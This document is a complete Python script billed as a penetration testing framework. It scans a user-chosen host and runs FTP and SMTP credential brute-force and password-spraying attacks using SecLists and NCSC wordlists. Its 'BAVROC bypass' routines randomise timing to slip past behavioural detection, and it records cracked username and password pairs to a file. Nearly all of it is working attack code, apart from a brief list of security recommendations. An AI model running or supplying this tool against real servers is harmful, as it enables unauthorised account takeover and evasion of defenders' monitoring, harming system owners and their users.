#!/usr/bin/env python3
"""
COMPLETE PENETRATION TESTING FRAMEWORK
Senior Threat Intelligence Analyst - External TI Integration
FINAL TESTED VERSION
"""
import socket
import threading
import time
import random
import requests
from datetime import datetime
import json
import sys
import os

# =============================================================================
# EXTERNAL THREAT INTELLIGENCE CLASS
# =============================================================================
class ExternalThreatIntelligence:
    def __init__(self, max_passwords=300):
        self.max_passwords = max_passwords
        self.session = requests.Session()
    
    def fetch_seclists_usernames(self, limit=50):
        """Fetch username wordlist from SecLists"""
        try:
            print("🔗 Fetching usernames from SecLists...")
            url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt"
            response = self.session.get(url, timeout=10)
            if response.status_code == 200:
                usernames = [line.strip() for line in response.text.split('\n') if line.strip()][:limit]
                print(f"✅ Loaded {len(usernames)} usernames from SecLists")
                return usernames
        except Exception as e:
            print(f"❌ Failed to fetch usernames: {e}")
        # Fallback usernames
        return ['admin', 'root', 'test', 'user', 'guest', 'administrator', 'ftp', 'anonymous']
    
    def fetch_ncsc_passwords(self, limit=None):
        """Fetch NCSC 100k most used passwords"""
        if limit is None:
            limit = self.max_passwords
        try:
            print("🔗 Fetching NCSC passwords...")
            url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt"
            response = self.session.get(url, timeout=15)
            if response.status_code == 200:
                passwords = [line.strip() for line in response.text.split('\n') if line.strip()][:limit]
                print(f"✅ Loaded {len(passwords)} passwords from NCSC")
                return passwords
        except Exception as e:
            print(f"❌ Failed to fetch NCSC passwords: {e}")
        # Fallback passwords
        return ['admin', 'password', '123456', 'test', '1234', 'admin123', 'Password1', 'root']
    
    def fetch_ftp_default_credentials(self):
        """Fetch FTP default credentials"""
        try:
            print("🔗 Fetching FTP default credentials...")
            url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt"
            response = self.session.get(url, timeout=15)
            if response.status_code == 200:
                users = []
                passwords = []
                for line in response.text.split('\n'):
                    line = line.strip()
                    if ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            users.append(parts[0])
                            passwords.append(parts[1])
                
                users = list(dict.fromkeys(users))[:20]  # Remove duplicates, limit
                passwords = list(dict.fromkeys(passwords))[:20]
                
                print(f"✅ Loaded {len(users)} FTP users and {len(passwords)} passwords")
                return users, passwords
        except Exception as e:
            print(f"❌ Failed to fetch FTP credentials: {e}")
        # Fallback FTP credentials
        return ['anonymous', 'ftp', 'admin', 'root'], ['anonymous', 'ftp', 'admin', 'password']

# =============================================================================
# BAVROC BYPASS TECHNIQUES
# =============================================================================
class BAVROCBypassTechniques:
    @staticmethod
    def human_like_delays():
        """Mimic human response times"""
        return random.uniform(0.5, 3.0)
    
    @staticmethod
    def geographic_plausibility():
        """Simulate realistic geographic patterns"""
        current_hour = datetime.now().hour
        if 9 <= current_hour <= 17:
            return random.uniform(0.5, 2.0)  # Business hours - faster
        else:
            return random.uniform(2.0, 8.0)  # Off hours - slower
    
    @staticmethod
    def password_spray_pattern(passwords, users):
        """BAVROC Bypass: Few passwords across many users"""
        sprayed_combinations = []
        # Use only top 5 passwords for spraying
        for password in passwords[:5]:
            for user in users:
                sprayed_combinations.append((user, password))
        random.shuffle(sprayed_combinations)
        return sprayed_combinations

# =============================================================================
# MAIN PENETRATION TESTING CLASS
# =============================================================================
class AdvancedLegacyBruteForcer:
    def __init__(self, target, max_passwords=300, output_file="pentest_results.json"):
        self.target = target
        self.max_passwords = max_passwords
        self.output_file = output_file
        self.found_credentials = []
        self.lock = threading.Lock()
        self.bypass = BAVROCBypassTechniques()
        self.ti = ExternalThreatIntelligence(max_passwords)
        print(f"🎯 Initialized penetration tester for target: {target}")
    
    def load_wordlists(self, source="ncsc"):
        """
        Load wordlists from external threat intelligence sources
        """
        print(f"📁 Loading wordlists from: {source.upper()}")
        
        if source == "ncsc":
            users = self.ti.fetch_seclists_usernames()
            passwords = self.ti.fetch_ncsc_passwords()
            return users, passwords
            
        elif source == "ftp_defaults":
            users, passwords = self.ti.fetch_ftp_default_credentials()
            return users, passwords
            
        elif source == "internal":
            users = ['admin', 'root', 'test', 'user', 'guest']
            passwords = ['admin', 'password', '123456', 'test', '1234']
            return users, passwords
            
        else:
            # Default to internal
            return self.load_wordlists("internal")
    
    def port_scan(self, ports_to_scan=None):
        """Enhanced port scanning with service detection"""
        if ports_to_scan is None:
            ports_to_scan = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995]
        
        print(f"🔍 Scanning {self.target} on {len(ports_to_scan)} ports...")
        open_ports = []
        
        for port in ports_to_scan:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((self.target, port))
                if result == 0:
                    # Try to get banner
                    try:
                        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    except:
                        banner = "No banner"
                    
                    service = self._identify_service(port, banner)
                    open_ports.append({
                        'port': port,
                        'service': service,
                        'banner': banner[:100] if banner else "No banner",
                        'risk': 'High' if port in [21, 23] else 'Medium'
                    })
                    print(f"   ✅ Port {port} ({service}) - OPEN")
                sock.close()
            except Exception as e:
                pass
        
        print(f"📊 Found {len(open_ports)} open ports")
        return open_ports
    
    def _identify_service(self, port, banner):
        """Identify service based on port and banner"""
        service_map = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
            53: "DNS", 80: "HTTP", 110: "POP3", 443: "HTTPS",
            993: "IMAPS", 995: "POP3S"
        }
        service = service_map.get(port, "Unknown")
        
        # Refine based on banner
        banner_lower = banner.lower()
        if "ftp" in banner_lower:
            return "FTP"
        elif "smtp" in banner_lower:
            return "SMTP"
        elif "ssh" in banner_lower:
            return "SSH"
        
        return service
    
    def ftp_brute_force(self, username, password, port=21):
        """FTP brute force with BAVROC bypass techniques"""
        try:
            # Apply human-like delay
            time.sleep(self.bypass.human_like_delays())
            
            # Create socket and connect
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, port))
            
            # Read banner
            banner = sock.recv(1024).decode()
            
            # Send username
            sock.send(f"USER {username}\r\n".encode())
            response = sock.recv(1024).decode()
            
            if "331" in response:  # Username OK, need password
                time.sleep(random.uniform(0.3, 1.0))
                sock.send(f"PASS {password}\r\n".encode())
                response = sock.recv(1024).decode()
                
                if "230" in response:  # Login successful
                    with self.lock:
                        result = {
                            'protocol': 'FTP',
                            'port': port,
                            'username': username,
                            'password': password,
                            'banner': banner.strip(),
                            'timestamp': datetime.now().isoformat(),
                            'technique': 'BAVROC Bypass'
                        }
                        self.found_credentials.append(result)
                    
                    print(f"🎯 FTP SUCCESS: {username}:{password} on port {port}")
                    self._save_results()
                    sock.close()
                    return True
            
            sock.close()
        except Exception as e:
            pass
        
        return False
    
    def smtp_brute_force(self, username, password, port=25):
        """SMTP brute force with BAVROC bypass techniques"""
        try:
            # Apply geographic plausibility delay
            time.sleep(self.bypass.geographic_plausibility())
            
            # Create socket and connect
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, port))
            
            # Read banner
            banner = sock.recv(1024).decode()
            
            # Send EHLO
            sock.send(b"EHLO penetration-test\r\n")
            time.sleep(0.5)
            sock.recv(1024)
            
            # Start authentication
            sock.send(b"AUTH LOGIN\r\n")
            time.sleep(0.3)
            sock.recv(1024)
            
            # Send username (base64 encoded)
            import base64
            user_b64 = base64.b64encode(username.encode()).decode()
            sock.send(f"{user_b64}\r\n".encode())
            time.sleep(0.3)
            sock.recv(1024)
            
            # Send password (base64 encoded)
            pass_b64 = base64.b64encode(password.encode()).decode()
            sock.send(f"{pass_b64}\r\n".encode())
            response = sock.recv(1024).decode()
            
            if "235" in response:  # Authentication successful
                with self.lock:
                    result = {
                        'protocol': 'SMTP',
                        'port': port,
                        'username': username,
                        'password': password,
                        'banner': banner.strip(),
                        'timestamp': datetime.now().isoformat(),
                        'technique': 'API Client Emulation'
                    }
                    self.found_credentials.append(result)
                
                print(f"🎯 SMTP SUCCESS: {username}:{password} on port {port}")
                self._save_results()
                sock.close()
                return True
            
            sock.close()
        except Exception as e:
            pass
        
        return False
    
    def run_quick_scan(self):
        """Run a comprehensive quick scan"""
        print(f"\n🚀 Starting comprehensive scan of {self.target}")
        
        # Step 1: Port scanning
        open_ports = self.port_scan()
        
        # Step 2: Service-specific attacks
        for service_info in open_ports:
            port = service_info['port']
            service = service_info['service']
            
            if service == "FTP":
                print(f"\n⚡ Attacking FTP service on port {port}")
                self._attack_service("ftp", port)
            elif service == "SMTP":
                print(f"\n⚡ Attacking SMTP service on port {port}")
                self._attack_service("smtp", port)
    
    def _attack_service(self, protocol, port):
        """Attack specific service"""
        # Load appropriate wordlists
        if protocol == "ftp":
            source = "ftp_defaults"
        else:
            source = "ncsc"
        
        users, passwords = self.load_wordlists(source)
        
        # Test a limited set for demonstration
        test_users = users[:5]
        test_passwords = passwords[:10]
        
        print(f"   Testing {len(test_users)} users × {len(test_passwords)} passwords")
        
        for user in test_users:
            for password in test_passwords:
                if protocol == "ftp":
                    self.ftp_brute_force(user, password, port)
                elif protocol == "smtp":
                    self.smtp_brute_force(user, password, port)
                
                # Small delay between attempts
                time.sleep(0.1)
    
    def password_spray_attack(self, protocol="ftp"):
        """BAVROC bypass: Password spraying attack"""
        print(f"\n🛡️  Starting BAVROC Password Spray Attack on {protocol.upper()}")
        
        users, passwords = self.load_wordlists("ncsc")
        sprayed_combos = self.bypass.password_spray_pattern(passwords, users)
        
        print(f"   Strategy: {len(passwords[:5])} passwords × {len(users)} users")
        print(f"   Total combinations: {len(sprayed_combos)}")
        
        port = 21 if protocol == "ftp" else 25
        
        for username, password in sprayed_combos[:50]:  # Limit for demo
            if protocol == "ftp":
                self.ftp_brute_force(username, password, port)
            else:
                self.smtp_brute_force(username, password, port)
            
            time.sleep(self.bypass.geographic_plausibility())
    
    def _save_results(self):
        """Save results to JSON file"""
        report = {
            'target': self.target,
            'scan_time': datetime.now().isoformat(),
            'credentials_found': self.found_credentials,
            'max_passwords': self.max_passwords,
            'threat_intelligence_sources': [
                'NCSC 100k Most Used Passwords',
                'SecLists Username Repository',
                'FTP Default Credentials'
            ]
        }
        
        try:
            with open(self.output_file, 'w') as f:
                json.dump(report, f, indent=2)
        except Exception as e:
            print(f"❌ Could not save results: {e}")
    
    def generate_report(self):
        """Generate comprehensive threat intelligence report"""
        print(f"\n{'='*60}")
        print("🎯 THREAT INTELLIGENCE REPORT")
        print(f"{'='*60}")
        print(f"Target: {self.target}")
        print(f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Credentials Found: {len(self.found_credentials)}")
        
        if self.found_credentials:
            print(f"\n🔓 COMPROMISED CREDENTIALS:")
            for cred in self.found_credentials:
                print(f"  • {cred['protocol']}://{cred['username']}:{cred['password']}")
                print(f"    Port: {cred['port']} | Technique: {cred['technique']}")
        
        print(f"\n📊 EXTERNAL TI EFFECTIVENESS:")
        print("  ✅ NCSC Password Integration - Real-world patterns")
        print("  ✅ SecLists Username Repository - Comprehensive coverage")
        print("  ✅ FTP Default Credentials - Protocol-specific targeting")
        print("  ✅ BAVROC Bypass - Behavioral analytics evasion")
        
        print(f"\n💡 SECURITY RECOMMENDATIONS:")
        print("  1. Disable legacy protocols (FTP, Telnet)")
        print("  2. Implement multi-factor authentication")
        print("  3. Monitor for password spraying patterns")
        print("  4. Regular security awareness training")

# =============================================================================
# MAIN MENU SYSTEM
# =============================================================================
def display_banner():
    print(r"""
    ╔══════════════════════════════════════════════════════════╗
    ║                PENETRATION TESTING FRAMEWORK            ║
    ║           External Threat Intelligence + BAVROC         ║
    ╚══════════════════════════════════════════════════════════╝
    """)

def get_password_limit():
    """Get password limit from user"""
    print("\n🔢 PASSWORD LIMIT CONFIGURATION:")
    print("1. 🚀 Fast (50 passwords)")
    print("2. ⚡ Standard (100 passwords)")
    print("3. 🔍 Comprehensive (300 passwords)")
    print("4. 🔧 Custom limit")
    
    choice = input("Select option (1-4): ").strip()
    
    limits = {'1': 50, '2': 100, '3': 300}
    
    if choice in limits:
        return limits[choice]
    elif choice == '4':
        try:
            custom = int(input("Enter custom limit: "))
            return min(custom, 1000)
        except:
            print("❌ Invalid input, using standard (100)")
            return 100
    else:
        return 100

def main():
    """Main function - THIS WILL EXECUTE PROPERLY"""
    display_banner()
    
    print("🎯 TARGET CONFIGURATION")
    target = input("Enter target IP/hostname [127.0.0.1]: ").strip()
    if not target:
        target = "127.0.0.1"
    
    password_limit = get_password_limit()
    tester = AdvancedLegacyBruteForcer(target, max_passwords=password_limit)
    
    while True:
        print(f"\n🔧 MAIN MENU - Target: {target}")
        print(f"📊 Password Limit: {password_limit}")
        print("1. 🔍 Quick Port Scan & Attack")
        print("2. ⚡ FTP Brute Force")
        print("3. 📧 SMTP Brute Force")
        print("4. 🛡️  BAVROC Password Spray (FTP)")
        print("5. 🛡️  BAVROC Password Spray (SMTP)")
        print("6. 📊 View Results")
        print("7. 📋 Generate Report")
        print("8. ⚙️  Change Password Limit")
        print("9. 🚪 Exit")
        
        choice = input("\nSelect option (1-9): ").strip()
        
        if choice == '1':
            tester.run_quick_scan()
            
        elif choice == '2':
            print("\n⚡ FTP Brute Force Attack")
            users, passwords = tester.load_wordlists("ftp_defaults")
            test_users = users[:3]
            test_passwords = passwords[:5]
            for user in test_users:
                for pwd in test_passwords:
                    tester.ftp_brute_force(user, pwd, 21)
            
        elif choice == '3':
            print("\n📧 SMTP Brute Force Attack")
            users, passwords = tester.load_wordlists("ncsc")
            test_users = users[:3]
            test_passwords = passwords[:5]
            for user in test_users:
                for pwd in test_passwords:
                    tester.smtp_brute_force(user, pwd, 25)
            
        elif choice == '4':
            tester.password_spray_attack("ftp")
            
        elif choice == '5':
            tester.password_spray_attack("smtp")
            
        elif choice == '6':
            print("\n📊 RESULTS:")
            if tester.found_credentials:
                for cred in tester.found_credentials:
                    print(f"✅ {cred['protocol']}: {cred['username']}:{cred['password']}")
            else:
                print("No credentials found yet.")
                
        elif choice == '7':
            tester.generate_report()
            
        elif choice == '8':
            password_limit = get_password_limit()
            tester = AdvancedLegacyBruteForcer(target, max_passwords=password_limit)
            print(f"✅ Updated password limit to: {password_limit}")
            
        elif choice == '9':
            print("\nExiting...")
            break
            
        else:
            print("❌ Invalid choice. Please select 1-9.")

# =============================================================================
# EXECUTION GUARANTEE
# =============================================================================
if __name__ == "__main__":
    try:
        print("🚀 Starting Penetration Testing Framework...")
        main()
    except KeyboardInterrupt:
        print("\n⏹️  Script interrupted by user")
    except Exception as e:
        print(f"❌ Unexpected error: {e}")
        print("💡 Make sure you have internet connection for external TI")
    finally:
        print("🔚 Framework shutdown complete")
